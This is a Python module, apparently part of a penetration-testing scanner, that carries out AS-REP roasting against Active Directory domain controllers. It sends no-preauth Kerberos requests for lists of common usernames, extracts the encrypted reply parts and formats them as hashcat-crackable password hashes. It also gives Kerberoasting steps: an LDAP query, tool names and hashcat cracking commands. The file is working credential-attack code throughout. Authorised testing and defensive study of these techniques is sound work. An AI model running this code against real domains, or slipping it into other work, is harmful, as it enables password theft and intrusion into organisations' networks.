"""Kerberos hash extraction — AS-REP roast + Kerberoast.

Two related Kerberos misconfigurations that leak crackable hashes:

  - AS-REP roasting: When a user account has the DONT_REQ_PREAUTH flag,
    sending AS-REQ for that user returns an AS-REP whose encrypted-part
    (encrypted with the user's password-derived key) can be cracked offline.
    Output format for hashcat (mode 18200):
        $krb5asrep$23$user@DOMAIN:hash$rest_of_hash

  - Kerberoasting: Users with a SPN (Service Principal Name) have a TGS
    requested by anyone with valid credentials. We do a NETWORK-LEVEL
    detection (LDAP query for accounts with SPN set) — actually fetching
    the TGS requires valid credentials and is out of scope for unauth probes.
    Output format (hashcat mode 13100):
        $krb5tgs$23$*user$DOMAIN$spn*$encrypted_part

This module:
  1. Identifies AS-REP-roastable users via Phase 20's Kerberos enum
  2. Re-issues AS-REQ for those users and extracts the AS-REP encrypted-part
  3. Formats as hashcat-compatible strings
  4. For Kerberoasting: provides instructions + LDAP query strings
     (actual TGS extraction needs creds → out of scope)
"""

from __future__ import annotations

import logging
import socket
import struct
from typing import Optional

log = logging.getLogger(__name__)


def _build_as_req(domain: str, username: str) -> bytes:
    """Re-use the AS-REQ builder from ad_enum. This is a thin wrapper."""
    from .ad_enum import _build_as_req as _builder
    return _builder(domain, username, request_preauth=False)


def _extract_asrep_encrypted_part(resp_data: bytes) -> Optional[tuple[int, bytes]]:
    """Find the encrypted-part field in an AS-REP and return (etype, ciphertext).

    AS-REP structure (RFC 4120):
      AS-REP ::= [APPLICATION 11] SEQUENCE {
          ...
          enc-part [6] EncryptedData
      }
    EncryptedData ::= SEQUENCE {
        etype [0] Int32,
        kvno  [1] UInt32 OPTIONAL,
        cipher [2] OCTET STRING
    }

    We scan for the EncryptedData OCTET STRING — this is the crackable blob.
    """
    if not resp_data:
        return None
    # Look for AS-REP tag (0x6b = APPLICATION 11)
    if resp_data[0] != 0x6b:
        return None
    # Find [2] OCTET STRING within an enc-part — context tag 0xa2 followed by
    # OCTET STRING tag 0x04
    for i in range(len(resp_data) - 10):
        if resp_data[i] == 0xa0 and resp_data[i + 1] == 0x03 and \
           resp_data[i + 2] == 0x02 and resp_data[i + 3] == 0x01:
            etype = resp_data[i + 4]
            # Find the next OCTET STRING (cipher) after this etype
            j = i + 5
            while j < len(resp_data) - 2:
                if resp_data[j] == 0xa2:  # [2] context tag for cipher
                    # Skip the constructed wrapper if present
                    j += 1
                    if resp_data[j] & 0x80:
                        n = resp_data[j] & 0x7f
                        j += 1 + n
                    else:
                        j += 1
                    if resp_data[j] == 0x04:  # OCTET STRING
                        j += 1
                        if resp_data[j] & 0x80:
                            n = resp_data[j] & 0x7f
                            length = int.from_bytes(
                                resp_data[j + 1:j + 1 + n], "big"
                            )
                            j += 1 + n
                        else:
                            length = resp_data[j]
                            j += 1
                        cipher = resp_data[j:j + length]
                        return (etype, cipher)
                j += 1
    return None


def asrep_roast_user(kdc_ip: str, domain: str, username: str,
                      timeout: float = 4.0) -> Optional[dict]:
    """Request a TGT for `username` with no preauth.

    If the user has DONT_REQ_PREAUTH and we get an AS-REP, format the
    cipher for hashcat (mode 18200).
    """
    pkt = _build_as_req(domain, username)
    try:
        sock = socket.create_connection((kdc_ip, 88), timeout=timeout)
        sock.settimeout(timeout)
        sock.sendall(struct.pack(">I", len(pkt)) + pkt)
        hdr = sock.recv(4)
        if len(hdr) < 4:
            sock.close()
            return None
        resp_len = struct.unpack(">I", hdr)[0]
        resp = b""
        while len(resp) < min(resp_len, 16384):
            chunk = sock.recv(min(resp_len - len(resp), 4096))
            if not chunk:
                break
            resp += chunk
        sock.close()
    except (socket.timeout, OSError, struct.error) as e:
        log.debug("ASREProast %s@%s failed: %s", username, domain, e)
        return None

    if not resp or resp[0] != 0x6b:  # AS-REP tag
        return None

    # Phase 61: prefer proper ASN.1 DER parser from kerberos_advanced
    try:
        from ..protocols.kerberos_advanced import (extract_asrep_encrypted_part,
                                           format_asrep_hashcat,
                                           hashcat_mode_for_etype,
                                           etype_name as _etype_name)
        extracted = extract_asrep_encrypted_part(resp)
    except ImportError:
        extracted = _extract_asrep_encrypted_part(resp)

    if not extracted:
        return None

    etype, cipher = extracted
    if len(cipher) < 24:
        return None

    # Phase 61: use kerberos_advanced.format_asrep_hashcat for correct
    # per-etype layout (RC4 vs AES checksum positioning). Old code put
    # AES checksum in the wrong place — broke hashcat -m 19700.
    try:
        hashcat = format_asrep_hashcat(username, domain, etype, cipher)
        mode = hashcat_mode_for_etype(etype, "asrep")
        ename = _etype_name(etype)
    except (ValueError, NameError):
        # Fallback for unsupported etype or import failure
        cipher_hex = cipher.hex()
        hashcat = ("$krb5asrep$" + str(etype) + "$" + username + "@"
                    + domain.upper() + ":" + cipher_hex)
        mode = 18200 if etype == 23 else 0
        ename = {23: "RC4-HMAC", 17: "AES128", 18: "AES256"}.get(
            etype, "etype-" + str(etype)
        )

    return {
        "username": username,
        "domain": domain,
        "etype": etype,
        "etype_name": ename,
        "hashcat_format": hashcat,
        "cipher_length_bytes": len(cipher),
        "hashcat_mode": mode,
        "note": ("AS-REP hash extracted. Crack offline with: "
                 "hashcat -m " + str(mode) + " hash.txt wordlist.txt"),
    }


def asrep_roast_users(kdc_ip: str, domain: str, usernames: list[str],
                       timeout: float = 4.0) -> list[dict]:
    """Try AS-REP roast for many users; return only those that yielded hashes."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    hashes: list[dict] = []
    with ThreadPoolExecutor(max_workers=8) as pool:
        futs = [pool.submit(asrep_roast_user, kdc_ip, domain, u, timeout)
                 for u in usernames]
        for f in as_completed(futs):
            try:
                r = f.result()
                if r:
                    hashes.append(r)
            except Exception as e:
                log.debug("asrep_roast worker error: %s", e)
    return hashes


def kerberoast_hint(domain: str, dcs: list[dict]) -> dict:
    """Kerberoast detection HINT — actual TGS extraction requires creds.

    Returns instructions on how to perform full Kerberoasting given
    domain creds via impacket/Rubeus.
    """
    return {
        "feasibility": "requires_creds",
        "note": ("Kerberoasting requires valid domain credentials. "
                 "Given any user account password, query LDAP for "
                 "users with `servicePrincipalName` set, then request "
                 "a TGS for each SPN and crack offline (hashcat -m 13100)."),
        "ldap_query": ("(&(samAccountType=805306368)"
                       "(servicePrincipalName=*))"),
        "tools": ["impacket-GetUserSPNs", "Rubeus.exe kerberoast"],
        "domain": domain,
        "dcs": [dc.get("target") for dc in dcs],
    }


def run_roast(domain: str, kdc_ip: Optional[str] = None,
               usernames: Optional[list[str]] = None,
               timeout: float = 4.0) -> dict:
    """Orchestrator — discover DCs, AS-REP roast, surface Kerberoast guidance."""
    from .ad_enum import discover_dcs, COMMON_USERNAMES
    result: dict = {"domain": domain, "asrep_hashes": [],
                     "kerberoast_hint": None}

    if not kdc_ip:
        dcs = discover_dcs(domain, timeout=timeout)
        if not dcs:
            return result
        try:
            kdc_ip = socket.gethostbyname(dcs[0]["target"])
        except socket.gaierror:
            return result
        result["dcs"] = dcs
    else:
        dcs = []

    usernames = usernames or COMMON_USERNAMES
    log.info("ASREProast: testing %d usernames against %s", len(usernames), kdc_ip)
    hashes = asrep_roast_users(kdc_ip, domain, usernames, timeout=timeout)
    result["asrep_hashes"] = hashes
    result["kerberoast_hint"] = kerberoast_hint(domain, dcs)
    return result
